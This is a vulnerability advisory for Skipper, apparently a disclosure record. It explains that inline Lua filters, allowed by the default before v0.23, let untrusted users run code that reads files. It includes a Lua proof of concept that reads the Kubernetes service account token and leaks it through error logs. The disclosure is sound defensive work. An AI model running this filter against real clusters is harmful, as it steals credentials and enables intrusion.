title: "Skipper is vulnerable to arbitrary code execution through lua filters"
description: "Arbitrary code execution through [lua filters](https://opensource.zalando.com/skipper/reference/scripts/).\n\nThe
  default skipper configuration before v0.23 was `-lua-sources=inline,file`.\nThe
  problem starts if untrusted users can create lua filters, because of `-lua-sources=inline`
  , for example through a Kubernetes Ingress resource. The configuration `inline`
  allows these user to create a script that is able to read the filesystem accessible
  to the skipper process and if the user has access to read the logs they an read
  skipper secrets.\n\nKubernetes example (vulnerability is not limited to Kubernetes)\n```lua\nfunction
  request(ctx, params)\nlocal file = io.open('/var/run/secrets/kubernetes.io/serviceaccount/token',
  'r')\nif file then\nlocal token = file:read('*all')\nfile:close()\nerror('[EXFIL]
  ' .. token)  -- Exfiltrate via error logs\nend\nend\n```"
